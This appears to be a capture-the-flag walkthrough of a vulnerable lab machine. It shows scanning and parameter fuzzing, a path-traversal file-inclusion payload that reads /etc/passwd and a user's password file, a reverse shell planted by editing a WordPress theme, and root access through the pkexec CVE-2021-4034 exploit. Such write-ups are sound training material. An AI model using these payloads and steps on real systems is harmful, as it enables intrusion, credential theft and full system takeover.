Target: 10.0.0.18

    # nmap -sS -T4 -p- 10.0.0.18

    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

## ***HTTP***

Going to http, we have a wordpress site on the directory /wordpress.
We can see a user named victor on it.

    # gobuster dir -u http://10.0.0.18/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php

    /index.php            (Status: 200) [Size: 136]
    /image.php            (Status: 200) [Size: 147]
    /wordpress            (Status: 301) [Size: 310] [--> http://10.0.0.18/wordpress/]
    /dev                  (Status: 200) [Size: 131]                                  
    /javascript           (Status: 301) [Size: 311] [--> http://10.0.0.18/javascript/]
    /secret.txt           (Status: 200) [Size: 412]                                   
    /server-status        (Status: 403) [Size: 274] 

### ***http://10.0.0.18/secret.txt:***
    Looks like you have got some secrets.

    Ok I just want to do some help to you. 

    Do some more fuzz on every page of php which was finded by you. And if
    you get any right parameter then follow the below steps. If you still stuck 
    Learn from here a basic tool with good usage for OSCP.

    https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web
    


    //see the location.txt and you will get your next move//

This file tells us we need to fuzz.

    # wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -u 'http://10.0.0.18/index.php?FUZZ=something'

    =====================================================================
    ID           Response   Lines    Word       Chars       Payload                                   
    =====================================================================

    000000001:   200        7 L      12 W       136 Ch      "@"                                       
    000000003:   200        7 L      12 W       136 Ch      "01"                                      
    000000016:   200        7 L      12 W       136 Ch      "2002"                                    
    000000017:   200        7 L      12 W       136 Ch      "2003"                                    
    000000018:   200        7 L      12 W       136 Ch      "2004"                                    
    000000013:   200        7 L      12 W       136 Ch      "200"                                     
    000000007:   200        7 L      12 W       136 Ch      "10"                                      
    000000014:   200        7 L      12 W       136 Ch      "2000"                                    
    000000015:   200        7 L      12 W       136 Ch      "2001"                                    
    000000012:   200        7 L      12 W       136 Ch      "20"                                      
    000000010:   200        7 L      12 W       136 Ch      "123"                                     
    000000019:   200        7 L      12 W       136 Ch      "2005"                                    
    000000008:   200        7 L      12 W       136 Ch      "100"                                     
    000000002:   200        7 L      12 W       136 Ch      "00"                                      
    000000004:   200        7 L      12 W       136 Ch      "02"                                      
    000000005:   200        7 L      12 W       136 Ch      "03"                                      
    000000021:   200        7 L      12 W       136 Ch      "a"                                                
    000000011:   200        7 L      12 W       136 Ch      "2"                                                
    000000009:   200        7 L      12 W       136 Ch      "1000"                                             
    000000006:   200        7 L      12 W       136 Ch      "1"                                                
    000000025:   200        7 L      12 W       136 Ch      "about"                                            
    000000032:   200        7 L      12 W       136 Ch      "actions"                                          
    000000033:   200        7 L      12 W       136 Ch      "active"                                           
    000000036:   200        7 L      12 W       136 Ch      "_admin"                                           
    000000035:   200        7 L      12 W       136 Ch      "admin"                                            
    000000037:   200        7 L      12 W       136 Ch      "admin_"         
    ...                                

Most of the responses we got were with 136 characters. Let's see what happens when we search for responses with different chars.

    # wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt -u http://10.0.0.18/index.php?FUZZ=something --hh 136

    =====================================================================
    ID           Response   Lines    Word       Chars       Payload                                   
    =====================================================================

    000000341:   200        7 L      19 W       206 Ch      "file"                                    

We found the parameter name.
Now let's try to find the correct file name.

Going to ***http://10.0.0.18/index.php?file=something*** we get this message:

![image](https://user-images.githubusercontent.com/76552238/162931014-f652b57c-3e27-4096-a53f-aa148e2f79c1.png)

Going back to the secret message we found, it says to go to the file 'location.txt', let's see if it works.

Going to ***http://10.0.0.18/index.php?file=location.txt*** we get this message:

    ok well Now you reah at the exact parameter

    Now dig some more for next one
    use 'secrettier360' parameter on some other php page for more fun. 

Going to ***http://10.0.0.18/image.php?secrettier360=*** we get a message that we found the write parameter.

    # wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -u 'http://10.0.0.18/image.php?secrettier360=FUZZ' --hh 197

    =====================================================================
    ID           Response   Lines    Word       Chars       Payload                                   
    =====================================================================

    000001241:   200        13 L     43 W       328 Ch      "dev"                                     
    000002021:   200        13 L     29 W       333 Ch      "index.php" 

After scanning we get 2 files on the system. Going to ***http://10.0.0.18/image.php?secrettier360=dev*** we can see the content of the 'dev' file. This might suggest we are to perform a LFI (Local File Inclusion).

    # curl 'http://10.0.0.18/image.php?secrettier360=../../../../../etc/passwd'
    <html>
    <title>HacknPentest</title>
    <body>
    <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" /></p></p></p>
    </body>
    finaly you got the right parameter<br><br><br><br>root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
    systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
    systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
    systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
    syslog:x:104:108::/home/syslog:/bin/false
    _apt:x:105:65534::/nonexistent:/bin/false
    messagebus:x:106:110::/var/run/dbus:/bin/false
    uuidd:x:107:111::/run/uuidd:/bin/false
    lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
    whoopsie:x:109:117::/nonexistent:/bin/false
    avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
    avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
    dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
    colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
    speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
    hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
    kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
    pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
    rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
    saned:x:119:127::/var/lib/saned:/bin/false
    usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
    victor:x:1000:1000:victor,,,:/home/victor:/bin/bash
    mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
    saket:x:1001:1001:find password.txt file in my directory:/home/saket:
    sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
    </html>

And it works. Taking a closer look we can see another user on the machine named 'saket'. There is a little message next to his user.

    find password.txt file in my directory:/home/saket

Since we can read files on the machine using the LFI we found, we can read the password.txt file on the directory.

### ***http://10.0.0.18/image.php?secrettier360=../../../../../../../home/saket/password.txt:***

    follow_the_ippsec 

This password isn't valid for SSH, let's try to login to wordpress with it.
I tried logging in as the user 'saket' but it is not on Wordpress. So I tired the password with another user we know 'victor', and it worked.

The only file we can edit is 'secret.php'. We can upload a reverse shell script to it and update.  
Setting a listener on our local machine and going to http://10.0.0.18/wordpress/wp-content/themes/twentynineteen/secret.php we are able to get a reverse shell onto the machine.

    Local Machine
    # nc -lnvp 4444

    listening on [any] 4444 ...
    10.0.0.18: inverse host lookup failed: Unknown host
    connect to [10.0.0.27] from (UNKNOWN) [10.0.0.18] 33548
    Linux ubuntu 4.15.0-142-generic #146~16.04.1-Ubuntu SMP Tue Apr 13 09:27:15 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
    03:22:47 up 13 min,  0 users,  load average: 0.14, 0.08, 0.09
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    $ id -a
    uid=33(www-data) gid=33(www-data) groups=33(www-data) 

Going to /home/saket, we can find our first flag.

### ***user.txt:***
    af3c658dcf9d7190da3153519c003456

<!--Now that we can read files on the system, let's try to read files on the user 'victor's home directory or files on the wordpress directory.

I couldn't get to victor's home directory yet, but I played with the wordpress files and when I went to ***http://10.0.0.18/image.php?secrettier360=../../../../../../../var/www/html/wordpress/wp-trackback.php*** I got this error message:

![image](https://user-images.githubusercontent.com/76552238/162934980-0fdd9f6b-e791-4edb-86eb-dbdb4e817ded.png)

This might mean this page is vulnerable to XSS (Cross Site Scripting). -->

## ***PRIVILEGE ESCALATION***

    $ sudo -ll
    Matching Defaults entries for www-data on ubuntu:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User www-data may run the following commands on ubuntu:

    Sudoers entry:
        RunAsUsers: root
        Options: !authenticate
        Commands:
            /home/saket/enc

The user 'www-data' is able to run the command /home/saket/enc as root.

    $ find / -perm /4000 2> /dev/null

    /usr/sbin/pppd
    /usr/bin/pkexec
    /usr/bin/gpasswd
    /usr/bin/passwd
    /usr/bin/chsh
    /usr/bin/sudo
    /usr/bin/chfn
    /usr/bin/newgrp
    /usr/bin/vmware-user-suid-wrapper
    /usr/lib/policykit-1/polkit-agent-helper-1
    /usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
    /usr/lib/snapd/snap-confine
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/xorg/Xorg.wrap
    /usr/lib/openssh/ssh-keysign
    /bin/fusermount
    /bin/umount
    /bin/ping6
    /bin/mount
    /bin/su
    /bin/ping

After running linPeas on the machine, we find out it is vulnerable to ***CVE-2021-4034***. This is an exploit on the command ***pkexec*** that we found can be run with SUID permissions.

I found this repository on github ***https://github.com/ryaagard/CVE-2021-4034*** that allows us to get a shell as root using 'pkexec'. All we need to do it clone this to our remote machine, run make and execute the exploit, and voila, we have a shell as root.

    # cat root.txt
    b2b17036da1de94cfb024540a8e7075a